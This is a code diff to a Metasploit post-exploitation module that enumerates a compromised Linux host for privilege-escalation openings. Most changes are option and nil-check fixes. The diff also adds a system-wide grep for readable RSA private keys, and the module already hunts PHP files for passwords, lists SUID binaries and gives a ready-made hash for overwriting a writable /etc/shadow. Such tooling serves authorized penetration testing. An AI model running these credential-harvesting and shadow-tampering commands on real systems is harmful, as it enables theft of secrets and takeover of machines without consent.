@@ -32,7 +32,8 @@ class MetasploitModule < Msf::Post
     register_options(
       [
         OptInt.new('TIMEOUT', [ true, "Timeout on the execute command. (In seconds)", 300]),
-        OptString.new('PASSWORD', [ false, "Password of current user, for 'sudo su' check"])
+        OptString.new('PASSWORD', [ false, "Password of current user, for 'sudo su' check"]),
+        OptBool.new('DEEP', [ true, "Perform Deep File Scan", true])
       ], self.class)
   end
 
@@ -41,9 +42,10 @@ class MetasploitModule < Msf::Post
     @@quick_fails_ouput = "\n[*] QUICK FAIL$:\n"
 
     sysinfo = get_sysinfo
-    @@distro = file_read("/etc/issue").gsub(/\n|\\n|\\l/,'')
+    @@distro = file_read("/etc/issue")
+    @@distro = @@distro.gsub(/\n|\\n|\\l/,'') if @@distro
     @@kernel_full = sysinfo[:kernel]
-    @@release = sysinfo[:version] # @@release = execute("cat /etc/*-release")
+    @@release = sysinfo[:version]
     @@user = execute("whoami")
     @@hostname = execute("hostname")
 
@@ -85,8 +87,13 @@ class MetasploitModule < Msf::Post
     print_status("8 / 9 - Getting Processes and Application Information")
     proc_aps_info_output = proc_aps_info(@@release)
 
-    print_status("9 / 9 - Getting Extra Information and Performing Deep File Search")
-    extra_info_output = extra_info
+    if datastore['DEEP']
+      print_status("9 / 9 - Getting Extra Information and Performing Deep File Search")
+      extra_info_output = extra_info
+    else
+      print_status("9 / 9 - Skipping Deep File Search")
+      extra_info_output = ""
+    end
 
     # Build final output
     final_output << basic_info_output
@@ -102,6 +109,8 @@ class MetasploitModule < Msf::Post
     final_output << userenv_info_output
     final_output << smline
     final_output << file_dir_perms_output
+    final_output << smline
+    final_output << proc_aps_info_output
     final_output << smline
     final_output << extra_info_output
     final_output << bigline
@@ -151,6 +160,7 @@ class MetasploitModule < Msf::Post
 
   def format(input)
     output = ""
+    return "" unless input
     input.lines.each do |line|
       output << "    #{line}" if line.strip != ""
     end
@@ -288,8 +298,10 @@ class MetasploitModule < Msf::Post
   end
 
   def tools_info
-    output = "\n[*] INSTALLED LANGUAGES/TOOLS:\n"
+    output = "\n[*] PROGRAMMING LANGUAGES AND DEV TOOLS:\n"
     output << execute("which awk perl python ruby gcc g++ vi vim nano nmap find netcat nc ncat wget tftp ftp tcpdump 2>/dev/null")
+    output << "\n"
+    output << get("GIT Directories", "find / \\( -type d -name \".git\" \\) -exec ls -ld {} \\; 2>/dev/null")
     return output
   end
 
@@ -351,6 +363,7 @@ class MetasploitModule < Msf::Post
 
   def extra_info
     output = "\n[*] Extra Information and Deep File Search:\n"
+    output << get("Find files with readable RSA Private Keys", "grep -Irni \"BEGIN RSA PRIVATE KEY\" / 2>/dev/null")
     output << get("Listing other home folders", "ls -ahlR /home 2>/dev/null")
     output << files_owned_users
     output << get("PHP Files Containing Keyword: 'password'", "find / -name '*.php' 2>/dev/null | xargs -l10 egrep 'pwd|password|Password|PASSWORD' 2>/dev/null")
@@ -431,6 +444,7 @@ class MetasploitModule < Msf::Post
   def cpu_info
     output = ""
     result = file_read("/proc/cpuinfo")
+    return "" unless result
     cpu_info = result.split("\n\n")[0]
     cpu_info.split("\n").each do |line|
       output << "Speed: " + line.split(': ')[1] + "\n" if line =~ /cpu MHz/
@@ -444,7 +458,9 @@ class MetasploitModule < Msf::Post
 
   def suid_files
     output = ""
-    files = execute("find / \\( -perm -4000 \\) -exec ls -al --full-time {} \\; 2>/dev/null | sort -k6 | cut -d \" \" --complement -f 7,8").split("\n")
+    files = execute("find / \\( -perm -4000 \\) -exec ls -al --full-time {} \\; 2>/dev/null | sort -k6 | cut -d \" \" --complement -f 7,8")
+    return "" unless files
+    files = files.split("\n")
     files.each do |file|
       if file.downcase =~ /nmap/
         print_good("QUICKFAIL!: nmap has suid bit set!")
@@ -579,7 +595,7 @@ class MetasploitModule < Msf::Post
       print_good("QUICKFAIL!: /etc/shadow is world writable!")
       output << "\n[+] QUICKFAIL!: /etc/shadow is world writable!\n"
       output << format(result)
-      output << "\nNOTE: YOU NEED TO REBOOT TO RELOAD /etc/shadow!!! Is /etc/password writeable?\n"
+      output << "\nNOTE: YOU NEED TO REBOOT TO RELOAD /etc/shadow!!! Is /etc/shadow readable?\n"
       output << "\tUse hash: $1$5wAs2Vek$MolttqqR2ngg29PV6DacY1\n"
       output << "\tPassword: 12345\n"
       output << "\t\"That's the same combination I have on my luggage!\"\n"
